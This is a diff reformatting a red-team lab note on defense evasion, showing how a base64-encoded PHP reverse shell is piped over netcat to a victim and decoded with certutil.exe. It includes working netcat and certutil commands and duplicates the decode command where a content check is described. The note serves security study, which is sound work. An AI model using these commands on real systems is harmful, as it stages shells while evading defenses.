@@ -1,5 +1,6 @@
 ---
 description: Defense Evasion
+tags: [#defense-evasion]
 ---
 
 # Encode/Decode Data with Certutil
@@ -10,39 +11,36 @@ In this lab I will transfer a base64 encoded php reverse shell from my attacking
 
 Preview of the content to be encoded on the attacking system:
 
-![](../../.gitbook/assets/certutil-shellphp.png)
+![[certutil-shellphp.png]]
 
 Sending the above shell as a base64 encoded string to the victim system \(victim is listening and waiting for the file with `nc -l 4444 > enc`\):
 
-{% code title="attacker@local" %}
 ```csharp
+// attacker@local
 base64 < shell.php.gif | nc 10.0.0.2 4444
 ```
-{% endcode %}
 
 Once the file is received on the victim, let's check its contents:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 certutil.exe -decode .\enc dec
 ```
-{% endcode %}
 
-![](../../.gitbook/assets/certutil-encoded.png)
+![[certutil-encoded.png]]
 
 Let's decode the data:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 certutil.exe -decode .\enc dec
 ```
-{% endcode %}
 
 Let's have a look at the contents of the file `dec` which now contains the base64 decoded shell:
 
-![](../../.gitbook/assets/certutil-decoded.png)
+![[certutil-decoded.png]]
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1140" %}
+[attack.mitre.org/wiki/Technique/T1140](https://attack.mitre.org/wiki/Technique/T1140)
 
